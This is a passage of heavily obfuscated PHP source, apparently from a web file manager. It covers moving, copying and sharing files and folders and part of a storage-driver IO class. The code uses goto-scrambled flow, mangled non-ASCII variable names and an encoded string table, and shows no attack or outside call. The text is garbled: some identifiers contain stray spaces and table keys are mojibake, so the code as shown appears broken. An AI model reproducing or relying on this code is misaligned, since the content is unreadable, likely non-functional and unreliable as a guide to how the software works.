$this->lockWriteStart($dÄñ²ò×’, $cä·óˆ®×¨); $CôßŸî¶Œë = array($dåÃ¶‚‘ÅÇ[510] => array(), $dåÃ¶‚‘ÅÇ[542] => !1); $this->clearShare($Bæ²®ã œß, $dÄñ²ò×’); goto dŠ´±•®›; fØ“šïÉŠ½: $dåÃ¶‚‘ÅÇ =& $_SERVER[¯Ò¬Èè]; $bÃ‚Á‚­¼ = $this->sourceInfo($Bæ²®ã œß); $A¨¢íÓø¿ = $this->sourceInfo($dÄñ²ò×’); goto Eè¼ŠÀ± ; fÃ¨¿éÊ†: if ($bÃ‚Á‚­¼[$dåÃ¶‚‘ÅÇ[370]] == $dåÃ¶‚‘ÅÇ[83] && $A±ò¿ª§¦œ) { $this->folderSizeResetChildren($f¢Ã¥‰„¼†); } Model($dåÃ¶‚‘ÅÇ[167])->linkAdd($CôßŸî¶Œë[$dåÃ¶‚‘ÅÇ[510]]); if ($A±ò¿ª§¦œ && $CôßŸî¶Œë[$dåÃ¶‚‘ÅÇ[542]]) { $this->removeNow($Bæ²®ã œß, !1); } goto C¡­ôŒ¢¡³; E‡ç„°˜¢: } private function _move($D¢‘ä§¬˜, $Fà®ÆÙÛ“, $f×±öÉË£Ë, &$aÉ¼³´ô±É, $aÔºÀ–İÑ = '') { goto b›·¥à²–Ã; Cö²•¡Õ: return $F…ÖÜ¯¾Ñ­; goto FèŞ¸Ó’É; b›·¥à²–Ã: $D‹“‹íáñ =& $_SERVER[¯Ò¬Èè]; $FÃ‘ÔÑæ¥Ë = $this->sourceInfo($D¢‘ä§¬˜); $B¯Š—ºˆ„¦ = $FÃ‘ÔÑæ¥Ë[$D‹“‹íáñ[370]] == $D‹“‹íáñ[83]; goto CÖçã„Ïğ; cÃ­çÏ’Âä: $this->lockWriteStart($Fà®ÆÙÛ“, $d‚ÔÖ¥ñ©Æ); if (!$Cñ®‰¼ßÔØ) { return $this->_moveForce($D¢‘ä§¬˜, $Fà®ÆÙÛ“, $d‚ÔÖ¥ñ©Æ); } $F…ÖÜ¯¾Ñ­ = $Cñ®‰¼ßÔØ; goto eŸ„ˆÂÙÄŒ; CÖçã„Ïğ: $d‚ÔÖ¥ñ©Æ = $aÔºÀ–İÑ ? $aÔºÀ–İÑ : $FÃ‘ÔÑæ¥Ë[$D‹“‹íáñ[28]]; $Cñ®‰¼ßÔØ = $this->fileNameExistCache($Fà®ÆÙÛ“, $d‚ÔÖ¥ñ©Æ); $this->lockMoveStart($D¢‘ä§¬˜); goto cÃ­çÏ’Âä; eŸ„ˆÂÙÄŒ: $Bã¡´µØ÷Ó = !1; if ($B¯Š—ºˆ„¦) { if ($f×±öÉË£Ë == REPEAT_RENAME_FOLDER) { $d‚ÔÖ¥ñ©Æ = $this->fileNameAuto($Fà®ÆÙÛ“, $d‚ÔÖ¥ñ©Æ, $f×±öÉË£Ë, $B¯Š—ºˆ„¦); $F…ÖÜ¯¾Ñ­ = $this->_moveForce($D¢‘ä§¬˜, $Fà®ÆÙÛ“, $d‚ÔÖ¥ñ©Æ); } else { if ($f×±öÉË£Ë == REPEAT_RENAME_FOLDER) { $f×±öÉË£Ë = REPEAT_RENAME; } $BÌºœâ„šë = $this->_childrenListSelect($D¢‘ä§¬˜); foreach ($BÌºœâ„šë as $Fİ¼†ˆ§œª) { $this->_move($Fİ¼†ˆ§œª[$D‹“‹íáñ[369]], $Cñ®‰¼ßÔØ, $f×±öÉË£Ë, $aÉ¼³´ô±É); } $Bã¡´µØ÷Ó = !0; } } else { if ($f×±öÉË£Ë == REPEAT_SKIP) { $Bã¡´µØ÷Ó = !0; } else { if ($f×±öÉË£Ë == REPEAT_RENAME || $f×±öÉË£Ë == REPEAT_RENAME_FOLDER) { $d‚ÔÖ¥ñ©Æ = $this->fileNameAuto($Fà®ÆÙÛ“, $d‚ÔÖ¥ñ©Æ, $f×±öÉË£Ë, $B¯Š—ºˆ„¦); $F…ÖÜ¯¾Ñ­ = $this->_moveForce($D¢‘ä§¬˜, $Fà®ÆÙÛ“, $d‚ÔÖ¥ñ©Æ); } else { if ($f×±öÉË£Ë == REPEAT_REPLACE) { $F°¾öƒ¼Á– = $this->sourceInfoCache($Cñ®‰¼ßÔØ); $cÁùƒòçÌø = $this->fileHistory($F°¾öƒ¼Á–, $FÃ‘ÔÑæ¥Ë[$D‹“‹íáñ[419]], $FÃ‘ÔÑæ¥Ë[$D‹“‹íáñ[77]]); if ($cÁùƒòçÌø) { $aÉ¼³´ô±É[$D‹“‹íáñ[510]][] = $FÃ‘ÔÑæ¥Ë[$D‹“‹íáñ[419]]; } else { $Bã¡´µØ÷Ó = !0; } } } } } if ($Bã¡´µØ÷Ó && !$aÉ¼³´ô±É[$D‹“‹íáñ[542]]) { $aÉ¼³´ô±É[$D‹“‹íáñ[542]] = !0; } goto Cö²•¡Õ; FèŞ¸Ó’É: } private function _moveForce($F„õ‘‰æ™©, $cíë¤®ìñĞ, $Cö•Ó™áø) { goto aŠÄÔåÙ·©; F¹‰…ô÷¥: $D•³ÈÉŞ²¿ = $a¾ƒ×ê«…[$FÚè÷ÙäĞ[370]] == $FÚè÷ÙäĞ[83]; $e°¤Ò°È® = array($FÚè÷ÙäĞ[368] => $AÜöÔŠï·“[$FÚè÷ÙäĞ[369]], $FÚè÷ÙäĞ[534] => $AÜöÔŠï·“[$FÚè÷ÙäĞ[459]] . $AÜöÔŠï·“[$FÚè÷ÙäĞ[369]] . $FÚè÷ÙäĞ[47], $FÚè÷ÙäĞ[530] => $AÜöÔŠï·“[$FÚè÷ÙäĞ[371]], $FÚè÷ÙäĞ[531] => $AÜöÔŠï·“[$FÚè÷ÙäĞ[456]], $FÚè÷ÙäĞ[533] => USER_ID, $FÚè÷ÙäĞ[386] => $Cö•Ó™áø); $cÏÚßŸŠŠ = $a¾ƒ×ê«…[$FÚè÷ÙäĞ[371]] == SourceModel::TYPE_GROUP && $AÜöÔŠï·“[$FÚè÷ÙäĞ[371]] == SourceModel::TYPE_GROUP && $a¾ƒ×ê«…[$FÚè÷ÙäĞ[456]] == $AÜöÔŠï·“[$FÚè÷ÙäĞ[456]]; goto D„¥¬í¼ÀŸ; D„¥¬í¼ÀŸ: if (!$cÏÚßŸŠŠ) { Model($FÚè÷ÙäĞ[454])->authClear($F„õ‘‰æ™©); } $c·…Ô±‰ÁĞ = $a¾ƒ×ê«…[$FÚè÷ÙäĞ[397]] == $FÚè÷ÙäĞ[83] && $AÜöÔŠï·“[$FÚè÷ÙäĞ[397]] != $FÚè÷ÙäĞ[83]; if ($c·…Ô±‰ÁĞ) { $e°¤Ò°È®[$FÚè÷ÙäĞ[396]] = 0; } goto cŸÉ…íµÇù; cŸÉ…íµÇù: if ($D•³ÈÉŞ²¿) { $B“é“ğ— = array($FÚè÷ÙäĞ[534] => array($FÚè÷ÙäĞ[483], $a¾ƒ×ê«…[$FÚè÷ÙäĞ[459]] . $a¾ƒ×ê«…[$FÚè÷ÙäĞ[369]] . $FÚè÷ÙäĞ[484])); $AĞğ¾æ‡Ïî = $a¾ƒ×ê«…[$FÚè÷ÙäĞ[459]] . $a¾ƒ×ê«…[$FÚè÷ÙäĞ[369]] . $FÚè÷ÙäĞ[47]; $D…·ÀÛ¡‰ù = $AÜöÔŠï·“[$FÚè÷ÙäĞ[459]] . $AÜöÔŠï·“[$FÚè÷ÙäĞ[369]] . $FÚè÷ÙäĞ[47] . $a¾ƒ×ê«…[$FÚè÷ÙäĞ[369]] . $FÚè÷ÙäĞ[47]; $E‹¯í˜¨ = array($FÚè÷ÙäĞ[534] => array($FÚè÷ÙäĞ[543], "\x72\x65\x70\x6c\141\x63\x65\50\x70\x61\162\x65\156\x74\x4c\x65\166\x65\154\54\x27{$AĞğ¾æ‡Ïî}\47\x2c\x27{$D…·ÀÛ¡‰ù}\47\51"), $FÚè÷ÙäĞ[530] => $AÜöÔŠï·“[$FÚè÷ÙäĞ[371]], $FÚè÷ÙäĞ[531] => $AÜöÔŠï·“[$FÚè÷ÙäĞ[456]]); if ($c·…Ô±‰ÁĞ) { $E‹¯í˜¨[$FÚè÷ÙäĞ[396]] = 0; } $this->where($B“é“ğ—)->data($E‹¯í˜¨)->save(); } $this->where(array($FÚè÷ÙäĞ[383] => $F„õ‘‰æ™©))->data($e°¤Ò°È®)->save(); return $F„õ‘‰æ™©; goto c‹àİÔ¹‘Í; aŠÄÔåÙ·©: $FÚè÷ÙäĞ =& $_SERVER[¯Ò¬Èè]; $a¾ƒ×ê«… = $this->sourceInfo($F„õ‘‰æ™©); $AÜöÔŠï·“ = $this->sourceInfo($cíë¤®ìñĞ); goto F¹‰…ô÷¥; c‹àİÔ¹‘Í: } private function clearShare($CàêÔÀ²«, $FßÎÆÓ‘å ) { goto cìºŠÊ”Ô¡; Dêºª–Ä´: Model($EŞ—Å”Ş[545])->where($E×—ë‡‹Ç³)->save(array($EŞ—Å”Ş[448] => 0)); Model($EŞ—Å”Ş[546])->where($E×—ë‡‹Ç³)->delete(); goto AïñÅµáö¾; Aº¥Á£ïİØ: if (!$c‹¥Ã³é‘„) { return; } $E×—ë‡‹Ç³ = array($EŞ—Å”Ş[369] => array($EŞ—Å”Ş[7], $c‹¥Ã³é‘„), $EŞ—Å”Ş[448] => 1); $e×Éç­×¡‘ = Model($EŞ—Å”Ş[545])->field($EŞ—Å”Ş[441])->where($E×—ë‡‹Ç³)->select(); goto FÖ®§Õ¼‚³; C¾µ‡»­: if ($EœäË¾ÔŒƒ[$EŞ—Å”Ş[456]] == $A¹„Œ“ÚÓ˜[$EŞ—Å”Ş[456]] && $EœäË¾ÔŒƒ[$EŞ—Å”Ş[371]] == $EŞ—Å”Ş[544]) { return; } $E×—ë‡‹Ç³ = array($EŞ—Å”Ş[459] => array($EŞ—Å”Ş[483], $EœäË¾ÔŒƒ[$EŞ—Å”Ş[459]] . $CàêÔÀ²« . $EŞ—Å”Ş[484])); $c‹¥Ã³é‘„ = $this->field($EŞ—Å”Ş[383])->where($E×—ë‡‹Ç³)->getField($EŞ—Å”Ş[369], !0); goto Aº¥Á£ïİØ; FÖ®§Õ¼‚³: if (!$e×Éç­×¡‘) { return; } $e×Éç­×¡‘ = array_to_keyvalue($e×Éç­×¡‘, $EŞ—Å”Ş[33], $EŞ—Å”Ş[441]); $E×—ë‡‹Ç³ = array($EŞ—Å”Ş[441] => array($EŞ—Å”Ş[7], $e×Éç­×¡‘)); goto Dêºª–Ä´; cìºŠÊ”Ô¡: $EŞ—Å”Ş =& $_SERVER[¯Ò¬Èè]; $EœäË¾ÔŒƒ = $this->sourceInfo($CàêÔÀ²«); $A¹„Œ“ÚÓ˜ = $this->sourceInfo($FßÎÆÓ‘å ); goto C¾µ‡»­; AïñÅµáö¾: } public function copyFolderFromIO($f†µøÚ·™, $Aò…×¾”æ†, $E¹‚¼ïâ×Ê, $AåÈƒ¡¢İ, $F›œ¿ÜéÍŒ, $eÓ¯Ş°·ƒ± = false) { goto CÄ†óëÆ ; fò¼ƒœÈÊ: Hook::trigger($B´ßœöÄÉç[549]); if ($F÷·Âˆ“ö) { $this->folderSizeResetChildren($F÷·Âˆ“ö); } $this->_childrenListClear(); goto A£×Úïàµ; A£×Úïàµ: Model($B´ßœöÄÉç[513])->addAll($d‚áÍëñÇ[$B´ßœöÄÉç[511]], array(), !0); Model($B´ßœöÄÉç[514])->eventCopy($F÷·Âˆ“ö); $this->saveAll($d‚áÍëñÇ[$B´ßœöÄÉç[512]]); goto CîìÈ ¸Ù¢; F®Ñğ¦¬˜: if ($d¶Û¨£á®) { $this->_childrenAllMake($d¶Û¨£á®); } Hook::trigger($B´ßœöÄÉç[548]); $this->_copyChildTo($f†µøÚ·™, $Aò…×¾”æ†, $F÷·Âˆ“ö, $AåÈƒ¡¢İ, $d‚áÍëñÇ, $F›œ¿ÜéÍŒ); goto fò¼ƒœÈÊ; CîìÈ ¸Ù¢: Model($B´ßœöÄÉç[422])->linkAdd($d‚áÍëñÇ[$B´ßœöÄÉç[510]]); Model($B´ßœöÄÉç[422])->remove($d‚áÍëñÇ[$B´ßœöÄÉç[547]]); $this->folderSizeReset($E¹‚¼ïâ×Ê); goto B§‘®³á‘Ê; e­¹˜Íóê™: $d¶Û¨£á® = $this->fileNameExist($E¹‚¼ïâ×Ê, $a»É‘‹å); $F÷·Âˆ“ö = $this->mkdir($E¹‚¼ïâ×Ê, $a»É‘‹å, $AåÈƒ¡¢İ); if (!$d¶Û¨£á® || $AåÈƒ¡¢İ == REPEAT_RENAME_FOLDER) { $AåÈƒ¡¢İ = !1; } goto F®Ñğ¦¬˜; B§‘®³á‘Ê: $this->updateModifyTime($E¹‚¼ïâ×Ê); return $F÷·Âˆ“ö; goto cïîª‰—Í¹; CÄ†óëÆ : $B´ßœöÄÉç =& $_SERVER[¯Ò¬Èè]; $d‚áÍëñÇ = array($B´ßœöÄÉç[511] => array(), $B´ßœöÄÉç[512] => array(), $B´ßœöÄÉç[510] => array(), $B´ßœöÄÉç[547] => array()); $a»É‘‹å = $eÓ¯Ş°·ƒ± ? $eÓ¯Ş°·ƒ± : $f†µøÚ·™->getPathName($f†µøÚ·™->pathThis($Aò…×¾”æ†)); goto e­¹˜Íóê™; cïîª‰—Í¹: } private function _copyChildTo($A‹Úø—Òğ , $D­Ì‡ç»Ú, $Eê¯¡‹Ÿ––, $Fƒé–÷¡ß“, &$A´Õ­®ØÅ·, $cÑ×µÃÔ) { goto bïæ­¯’¶¾; D–£ŒÆ¢Øò: $f–‚à™•Ä¬ = $this->_childrenList($Eê¯¡‹Ÿ––); $f–‚à™•Ä¬ = array_to_keyvalue($f–‚à™•Ä¬, $F³¼ìÁéœŒ[28]); foreach ($eæ¢Œ“Úò as $c¢‡¤…Ô‚) { $bÄ“÷Õø×Ú = $f–‚à™•Ä¬[$c¢‡¤…Ô‚[$F³¼ìÁéœŒ[28]]]; $c¸ñ‚ìóé = $bÄ“÷Õø×Ú[$F³¼ìÁéœŒ[369]]; $this->_copyApplyMeta($bÄ“÷Õø×Ú, $A´Õ­®ØÅ·); if ($c¢‡¤…Ô‚[$F³¼ìÁéœŒ[29]] == $F³¼ìÁéœŒ[76]) { $c¢‡¤…Ô‚[$F³¼ìÁéœŒ[75]] = $A‹Úø—Òğ ->getPathInner($c¢‡¤…Ô‚[$F³¼ìÁéœŒ[75]]); $this->_copyChildTo($A‹Úø—Òğ , $c¢‡¤…Ô‚[$F³¼ìÁéœŒ[75]], $c¸ñ‚ìóé, $Fƒé–÷¡ß“, $A´Õ­®ØÅ·, $cÑ×µÃÔ); } } goto eÖÍ˜ğ°Ê; C¯…“²Š´: foreach ($eæ¢Œ“Úò as &$c¢‡¤…Ô‚) { goto DÑŸ¡‘‹“ ; e·â£‚ÒÈ”: if ($Fƒé–÷¡ß“) { $BÖóå†¤ÓÙ = $this->fileNameExistCache($Eê¯¡‹Ÿ––, $c¢‡¤…Ô‚[$F³¼ìÁéœŒ[28]]); if ($BÖóå†¤ÓÙ) { if ($c¢‡¤…Ô‚[$F³¼ìÁéœŒ[370]] || $Fƒé–÷¡ß“ == REPEAT_SKIP) { continue; } if ($Fƒé–÷¡ß“ == REPEAT_REPLACE) { $bÄ“÷Õø×Ú = $this->sourceInfoCache($BÖóå†¤ÓÙ); $f—‰Ëø¥Ã = $this->fileHistory($bÄ“÷Õø×Ú, $c¢‡¤…Ô‚[$F³¼ìÁéœŒ[419]], $c¢‡¤…Ô‚[$F³¼ìÁéœŒ[77]]); if ($f—‰Ëø¥Ã) { $A´Õ­®ØÅ·[$F³¼ìÁéœŒ[510]][] = $c¢‡¤…Ô‚[$F³¼ìÁéœŒ[419]]; } continue; } else { if ($Fƒé–÷¡ß“ == REPEAT_RENAME) { $c¢‡¤…Ô‚[$F³¼ìÁéœŒ[28]] = $this->fileNameAutoCache($Eê¯¡‹Ÿ––, $c¢‡¤…Ô‚[$F³¼ìÁéœŒ[28]], $Fƒé–÷¡ß“, !1); } } } } if (!$c¢‡¤…Ô‚[$F³¼ìÁéœŒ[370]] && $c¢‡¤…Ô‚[$F³¼ìÁéœŒ[419]]) { $A´Õ­®ØÅ·[$F³¼ìÁéœŒ[510]][] = $c¢‡¤…Ô‚[$F³¼ìÁéœŒ[419]]; } $b‚Š¾è´’‹[] = $this->_makeItemData($c¢‡¤…Ô‚, $bÀÙ¾¥”š®, $c¢‡¤…Ô‚[$F³¼ìÁéœŒ[28]]); goto AÅê·²‡¾¶; cŸ¢®‰¯À: $c¢‡¤…Ô‚[$F³¼ìÁéœŒ[77]] = _get($c¢‡¤…Ô‚, $F³¼ìÁéœŒ[77], 0); $c¢‡¤…Ô‚[$F³¼ìÁéœŒ[419]] = _get($c¢‡¤…Ô‚, $F³¼ìÁéœŒ[419], 0); if (!isset($c¢‡¤…Ô‚[$F³¼ìÁéœŒ[550]]) && $c¢‡¤…Ô‚[$F³¼ìÁéœŒ[419]]) { $A´Õ­®ØÅ·[$F³¼ìÁéœŒ[547]][] = $c¢‡¤…Ô‚[$F³¼ìÁéœŒ[419]]; } goto e·â£‚ÒÈ”; DÑŸ¡‘‹“ : if (isset($CîîÇ˜®…[$c¢‡¤…Ô‚[$F³¼ìÁéœŒ[28]]])) { $c¢‡¤…Ô‚ = $CîîÇ˜®…[$c¢‡¤…Ô‚[$F³¼ìÁéœŒ[28]]]; } $c¢‡¤…Ô‚[$F³¼ìÁéœŒ[370]] = $c¢‡¤…Ô‚[$F³¼ìÁéœŒ[29]] == $F³¼ìÁéœŒ[76]; $c¢‡¤…Ô‚[$F³¼ìÁéœŒ[372]] = _get($c¢‡¤…Ô‚, $F³¼ìÁéœŒ[160], $F³¼ìÁéœŒ[33]); goto cŸ¢®‰¯À; AÅê·²‡¾¶: } unset($c¢‡¤…Ô‚); if (!empty($b‚Š¾è´’‹)) { $this->addAll($b‚Š¾è´’‹); } goto D–£ŒÆ¢Øò; CÙ­ßÙƒ°ˆ: $eæ¢Œ“Úò = array_merge($f†˜Ê‰ì–[$F³¼ìÁéœŒ[73]], $f†˜Ê‰ì–[$F³¼ìÁéœŒ[74]]); $CîîÇ˜®… = $this->_addFiles($A‹Úø—Òğ , $f†˜Ê‰ì–[$F³¼ìÁéœŒ[73]], $cÑ×µÃÔ); $b‚Š¾è´’‹ = array(); goto C¯…“²Š´; bïæ­¯’¶¾: $F³¼ìÁéœŒ =& $_SERVER[¯Ò¬Èè]; $bÀÙ¾¥”š® = $this->sourceInfoCache($Eê¯¡‹Ÿ––); $f†˜Ê‰ì– = $A‹Úø—Òğ ->listPath($D­Ì‡ç»Ú, !1, !0); goto CÙ­ßÙƒ°ˆ; eÖÍ˜ğ°Ê: } private function _addFiles($d‡ö•É¡Ï˜, $c®‹—Ïßºí, $A«½³‚É…›) { goto Fğ˜¯·¨Ôñ; e±ùÍÒØƒ±: foreach ($c®‹—Ïßºí as &$dÈĞ©‹ŠŠÛ) { goto dŞ¦ËÒ‚Ä«; dŞ¦ËÒ‚Ä«: Hook::trigger($AÒá½™Õ¸ª[551], $dÈĞ©‹ŠŠÛ); $dÈĞ©‹ŠŠÛ[$AÒá½™Õ¸ª[75]] = $d‡ö•É¡Ï˜->getPathInner($dÈĞ©‹ŠŠÛ[$AÒá½™Õ¸ª[75]]); $AÆçÔ‘¢Ëª = $d‡ö•É¡Ï˜->hashSimple($dÈĞ©‹ŠŠÛ[$AÒá½™Õ¸ª[75]]); goto B‹Æ„ª“; c±õËÊˆö’: if (count($aÁ¬ˆ¬æ¼[$DŠ£ƒåâè]) > 1) { $dÈĞ©‹ŠŠÛ[$AÒá½™Õ¸ª[550]] = !0; } goto d¬Ê±„İ; B‹Æ„ª“: $DŠ£ƒåâè = $d‡ö•É¡Ï˜->hashMd5($dÈĞ©‹ŠŠÛ[$AÒá½™Õ¸ª[75]]); if (strlen($DŠ£ƒåâè) > 10 && !isset($aÁ¬ˆ¬æ¼[$DŠ£ƒåâè])) { $aÁ¬ˆ¬æ¼[$DŠ£ƒåâè] = array(); } $dÈĞ©‹ŠŠÛ[$AÒá½™Õ¸ª[164]] = $AÆçÔ‘¢Ëª; goto E¿‡„‡ƒÑÀ; E¿‡„‡ƒÑÀ: $dÈĞ©‹ŠŠÛ[$AÒá½™Õ¸ª[163]] = $DŠ£ƒåâè; Hook::trigger($AÒá½™Õ¸ª[552], $dÈĞ©‹ŠŠÛ); $aÁ¬ˆ¬æ¼[$DŠ£ƒåâè][] =& $dÈĞ©‹ŠŠÛ; goto c±õËÊˆö’; d¬Ê±„İ: } $E×Şç´ç×˜ = array($AÒá½™Õ¸ª[163] => array($AÒá½™Õ¸ª[7], array_keys($aÁ¬ˆ¬æ¼))); $d²’ˆ“¡³Æ = Model($AÒá½™Õ¸ª[553]); goto dŒ¨†ƒäãõ; Fğ˜¯·¨Ôñ: $AÒá½™Õ¸ª =& $_SERVER[¯Ò¬Èè]; if (!$c®‹—Ïßºí || count($c®‹—Ïßºí) == 0) { return array(); } $aÁ¬ˆ¬æ¼ = array(); goto e±ùÍÒØƒ±; c¦Ğ†ï¾ğ: foreach ($FŠ×œÛÅ« as $a„Ã„ëÌò™) { if (!isset($aÁ¬ˆ¬æ¼[$a„Ã„ëÌò™[$AÒá½™Õ¸ª[163]]])) { continue; } $d¸Ç‚§‹È =& $aÁ¬ˆ¬æ¼[$a„Ã„ëÌò™[$AÒá½™Õ¸ª[163]]]; foreach ($d¸Ç‚§‹È as &$dÈĞ©‹ŠŠÛ) { $dÈĞ©‹ŠŠÛ[$AÒá½™Õ¸ª[419]] = $a„Ã„ëÌò™[$AÒá½™Õ¸ª[419]]; } unset($dÈĞ©‹ŠŠÛ); } $bé¨¿ÓÁó = array(); foreach ($c®‹—Ïßºí as $d×»îìÖ¥”) { $bé¨¿ÓÁó[$d×»îìÖ¥”[$AÒá½™Õ¸ª[28]]] = $d×»îìÖ¥”; } goto Eº¿¦‹¥»‹; Eº¿¦‹¥»‹: return $bé¨¿ÓÁó; goto cÈ‘äœíøÖ; a÷…İ˜¤Ò: $CØíªÊî‘á = array(); foreach ($c®‹—Ïßºí as $aŒØŸ¥ù–Š) { if (isset($aŒØŸ¥ù–Š[$AÒá½™Õ¸ª[550]]) && $aŒØŸ¥ù–Š[$AÒá½™Õ¸ª[550]]) { continue; } $B¨Œáù¥•ƒ = $d‡ö•É¡Ï˜->getPathInner($aŒØŸ¥ù–Š[$AÒá½™Õ¸ª[75]]); $fÇ±…ó Ü = $d²’ˆ“¡³Æ->addFileMake($B¨Œáù¥•ƒ, $aŒØŸ¥ù–Š[$AÒá½™Õ¸ª[77]], $aŒØŸ¥ù–Š[$AÒá½™Õ¸ª[164]], $aŒØŸ¥ù–Š[$AÒá½™Õ¸ª[163]], $aŒØŸ¥ù–Š[$AÒá½™Õ¸ª[28]], $A«½³‚É…›); $CØíªÊî‘á[] = $fÇ±…ó Ü; } $d²’ˆ“¡³Æ->addAll($CØíªÊî‘á); goto dî‘æß’—„; dî‘æß’—„: $E×Şç´ç×˜ = array($AÒá½™Õ¸ª[163] => array($AÒá½™Õ¸ª[7], array_keys($aÁ¬ˆ¬æ¼))); $FŠ×œÛÅ« = $d²’ˆ“¡³Æ->where($E×Şç´ç×˜)->select(); $FŠ×œÛÅ« = $FŠ×œÛÅ« ? $FŠ×œÛÅ« : array(); goto c¦Ğ†ï¾ğ; dŒ¨†ƒäãõ: $FŠ×œÛÅ« = $d²’ˆ“¡³Æ->where($E×Şç´ç×˜)->select(); $FŠ×œÛÅ« = $FŠ×œÛÅ« ? $FŠ×œÛÅ« : array(); foreach ($FŠ×œÛÅ« as $a„Ã„ëÌò™) { if (!isset($aÁ¬ˆ¬æ¼[$a„Ã„ëÌò™[$AÒá½™Õ¸ª[163]]])) { continue; } $eÔ¡†òÛ­• = $aÁ¬ˆ¬æ¼[$a„Ã„ëÌò™[$AÒá½™Õ¸ª[163]]]; foreach ($eÔ¡†òÛ­• as &$dÈĞ©‹ŠŠÛ) { $dÈĞ©‹ŠŠÛ[$AÒá½™Õ¸ª[419]] = $a„Ã„ëÌò™[$AÒá½™Õ¸ª[419]]; $dÈĞ©‹ŠŠÛ[$AÒá½™Õ¸ª[550]] = !0; } unset($dÈĞ©‹ŠŠÛ); } goto a÷…İ˜¤Ò; cÈ‘äœíøÖ: } } goto Cå›¯å¶“¶; F»ÑƒÚ«×Ã: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($Bù¯‚ïÁ†Ş, $bµù•”ó³) { $a™ğÛ»›èœ = self::driverMake($bµù•”ó³[0]); if (method_exists($a™ğÛ»›èœ, $Bù¯‚ïÁ†Ş)) { return @call_user_func_array(array($a™ğÛ»›èœ, $Bù¯‚ïÁ†Ş), $bµù•”ó³); } if (method_exists($a™ğÛ»›èœ, $_SERVER[¯Ò¬Èè][1006])) { return @call_user_func_array(array($a™ğÛ»›èœ, $Bù¯‚ïÁ†Ş), $bµù•”ó³); } else { if (method_exists(self, $Bù¯‚ïÁ†Ş)) { return @call_user_func_array(array(self, $Bù¯‚ïÁ†Ş), $bµù•”ó³); } else { call_user_func_array(array(parent, $Bù¯‚ïÁ†Ş), $bµù•”ó³); } } } public static function init($AÃçëÈ†) { return self::driverMake($AÃçëÈ†); } public static function copy($C©‹•à÷æõ, $E±‰‰ÇµãŒ, $AÉŒàåƒ¼À = false, $DÎöç¦¹£‰ = false) { return self::copyMove($C©‹•à÷æõ, $E±‰‰ÇµãŒ, $AÉŒàåƒ¼À, $_SERVER[¯Ò¬Èè][499], $DÎöç¦¹£‰); } public static function move($bùãÒ‘Òƒà, $BõÖÙÜÀë‘, $DÎ˜ÌõÆŒî = false, $CÎ¦„¥»Æ = false) { return self::copyMove($bùãÒ‘Òƒà, $BõÖÙÜÀë‘, $DÎ˜ÌõÆŒî, $_SERVER[¯Ò¬Èè][501], $CÎ¦„¥»Æ); } public static function saveFile($CíµÑİÂ˜, $aÒ™¾ŸÌ, $bÛÇ«é„ = true) { goto bâºŞ‰”Ø; A¥¨ÖÏœ‡ñ: $EÑ³ˆìÕ¯Ğ = $B²©§ÍÄÅ¶->pathFather($aÒ™¾ŸÌ); $eÈÕŸäóº˜ = !0; if (!$bÛÇ«é„ && self::driverIsSame($c¦ôÖ›ÏÜĞ, $B²©§ÍÄÅ¶)) { $eÈÕŸäóº˜ = !1; } goto Dˆƒœ¥­Èò; Dˆƒœ¥­Èò: $a¹ˆòÃÑÆ = self::copyFile($c¦ôÖ›ÏÜĞ, $CíµÑİÂ˜, $B²©§ÍÄÅ¶, $EÑ³ˆìÕ¯Ğ, $A¼Œ Ú‰¨‰[$DÍËÃ¢¯Ó×[28]], $eÈÕŸäóº˜); if ($cî³ší) { $a¹ˆòÃÑÆ = $cî³ší->getPathOuter($a¹ˆòÃÑÆ); } return $a¹ˆòÃÑÆ; goto Aêˆá¹Œ÷; bâºŞ‰”Ø: $DÍËÃ¢¯Ó× =& $_SERVER[¯Ò¬Èè]; $A¼Œ Ú‰¨‰ = self::info($aÒ™¾ŸÌ); $c¦ôÖ›ÏÜĞ = self::driverMake($CíµÑİÂ˜); goto EÅ”ÒÅÛµœ; EÅ”ÒÅÛµœ: $B²©§ÍÄÅ¶ = self::driverMake($aÒ™¾ŸÌ); $cî³ší = !1; if ($B²©§ÍÄÅ¶->pathParse[$DÍËÃ¢¯Ó×[1007]]) { $aåˆ™ƒ˜Êñ = $B²©§ÍÄÅ¶->pathParse[$DÍËÃ¢¯Ó×[1007]]; $cî³ší = $B²©§ÍÄÅ¶; $B²©§ÍÄÅ¶ = self::driverMake($aåˆ™ƒ˜Êñ); } goto A¥¨ÖÏœ‡ñ; Aêˆá¹Œ÷: } private static function copyMove($a‰ËïÕ‚÷ä, $DÙ‘³ß¨, $D¾Ëì†ĞÃ, $AÇÈìùãŒª, $bĞÓš’•µ“ = false) { goto a Ç…˜  ; E‘Â£Î‰£ƒ: Hook::trigger($DÉïŒ‘ö¹¾[72], $FÖÕªæÚùÙ, $a‰ËïÕ‚÷ä, $a¼¬–ò•¦™, $DÙ‘³ß¨); $dã§óª£ª = self::driverIsSame($FÖÕªæÚùÙ, $a¼¬–ò•¦™); if ($dã§óª£ª) { if ($AÇÈìùãŒª == $DÉïŒ‘ö¹¾[501] && !method_exists($a¼¬–ò•¦™, $DÉïŒ‘ö¹¾[1008]) && trim($DÙ‘³ß¨, $DÉïŒ‘ö¹¾[8]) == trim($a¼¬–ò•¦™->pathFather($a‰ËïÕ‚÷ä), $DÉïŒ‘ö¹¾[8])) { return $a¼¬–ò•¦™->getPathOuter($a‰ËïÕ‚÷ä); } if (method_exists($a¼¬–ò•¦™, $AÇÈìùãŒª)) { return $a¼¬–ò•¦™->{$AÇÈìùãŒª}($a‰ËïÕ‚÷ä, $DÙ‘³ß¨, $D¾Ëì†ĞÃ); } } goto DŒ¹”£Š‹; DŒ¹”£Š‹: $F®Ğ…»í«Ö = $FÖÕªæÚùÙ->isFile($a‰ËïÕ‚÷ä); if (!$F®Ğ…»í«Ö && $a¼¬–ò•¦™->getType() == $DÉïŒ‘ö¹¾[708] && $FÖÕªæÚùÙ->getType() == $DÉïŒ‘ö¹¾[102]) { $Bæ‘ğš—Ğ = $a¼¬–ò•¦™->copyFolderFromIO($FÖÕªæÚùÙ, $a‰ËïÕ‚÷ä, $DÙ‘³ß¨, $D¾Ëì†ĞÃ, $eº‡‡³œÉ´, $bĞÓš’•µ“); } else { $Bæ‘ğš—Ğ = self::copyPath($FÖÕªæÚùÙ, $a‰ËïÕ‚÷ä, $a¼¬–ò•¦™, $DÙ‘³ß¨, $D¾Ëì†ĞÃ, $eº‡‡³œÉ´, $F®Ğ…»í«Ö, $bĞÓš’•µ“); } if ($Bæ‘ğš—Ğ && 